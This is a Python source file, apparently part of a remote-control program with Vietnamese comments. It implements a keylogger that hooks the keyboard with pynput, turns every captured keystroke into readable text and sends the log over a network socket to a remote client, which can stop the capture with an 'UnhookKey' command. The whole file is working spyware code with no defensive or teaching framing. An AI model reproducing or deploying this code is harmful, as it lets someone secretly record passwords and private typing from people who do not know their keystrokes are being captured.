from threading import Thread
from pynput.keyboard import Key, Listener, Controller
from tkinter import *


def Keystroke(Client):
    Keyboards = Controller()
    Stop = True
    ListKeys = []
    def StopHook():
        nonlocal Stop
        while True:
            if Stop == True:
                try:
                    while True:                       
                        checkdata = Client.recv(1024).decode("utf-8")
                        if checkdata == "UnhookKey":                
                            print(Stop) 
                            Stop = False
                            break
                finally:
                    Keyboards.release(Key.space)
            break

    def KeyLogger():
        while True:
            def Pressing(logger): #Nhận phím
                nonlocal ListKeys
                ListKeys.append(logger)
            def Releasing(logger):
                print(Stop)# Điều kiện ngừng vòng lặp
                if Stop == False: listener.stop()
            with Listener(on_release = Releasing, on_press = Pressing) as listener:
                listener.join()
            def Writing(ListKeys):
                global count
                logging = ''
                count = 0
                for logger in ListKeys:
                    temp = str(logger).replace("'","")
                    
                    if(str(temp) == "Key.space"): temp = " "
                    elif(str(temp) == "Key.backspace"): temp = "Backspace"
                    elif(str(temp) == "Key.shift"): temp = ""

                    temp = str(temp).replace("Key.",'')
                    temp = str(temp).replace("Key.cmd","")

                    if(str(temp) == "<96>"): temp = "0"
                    elif(str(temp) == "<97>"): temp = "1"
                    elif(str(temp) == "<98>"): temp = "2"
                    elif(str(temp) == "<99>"): temp = "3"
                    elif(str(temp) == "<100>"): temp = "4"
                    elif(str(temp) == "<101"): temp = "5"
                    elif(str(temp) == "<102>"): temp = "6"
                    elif(str(temp) == "<103>"): temp = "7"
                    elif(str(temp) == "<104>"): temp = "8"
                    elif(str(temp) == "<105>"): temp = "9"

                    temp = str(temp).replace("<home>","Home")
                    temp = str(temp).replace("<esc>","ESC")
                    temp = str(temp).replace("<tab>","")
                    temp = str(temp).replace("<cmd>","fn")
                    temp = str(temp).replace("<enter>","Enter")
                    temp = str(temp).replace("<caps_lock>","")
                    temp = str(temp).replace("<shift_l>","")
                    temp = str(temp).replace("<shift_r>","")
                    temp = str(temp).replace("<ctrl_l>","")
                    temp = str(temp).replace("<num_lock>","")
                    temp = str(temp).replace("<ctrl_r>","")
                    temp = str(temp).replace("<alt_l>","")
                    temp = str(temp).replace("<alt_gr>","")
                    temp = str(temp).replace("<delete>","Del")
                    temp = str(temp).replace("<print_screen>","PrtSc")

                    temp = str(temp).replace("home","Home")
                    temp = str(temp).replace("esc","ESC")
                    temp = str(temp).replace("tab","")
                    temp = str(temp).replace("cmd","fn")
                    temp = str(temp).replace("enter","Enter")
                    temp = str(temp).replace("caps_lock","")
                    temp = str(temp).replace("shift_l","")
                    temp = str(temp).replace("shift_r","")
                    temp = str(temp).replace("ctrl_l","")
                    temp = str(temp).replace("num_lock","")
                    temp = str(temp).replace("ctrl_r","")
                    temp = str(temp).replace("alt_l","")
                    temp = str(temp).replace("alt_gr","")
                    temp = str(temp).replace("delete","Del")
                    temp = str(temp).replace("print_screen","PrtSc")
                    
                    logging += temp
                    count+=1
                    print(logging)
                return logging[0:]
            data = Writing(ListKeys)
            if data == "": data = " "
            print(data)
            Client.sendall(bytes(data,"utf-8"))
            checkdata = Client.recv(1024).decode("utf-8")
            ListKeys.clear()
            break
    threadingLogger = Thread(target = KeyLogger)
    threadingStop = Thread(target = StopHook)
    threadingStop.start()
    threadingLogger.start()
    threadingLogger.join()
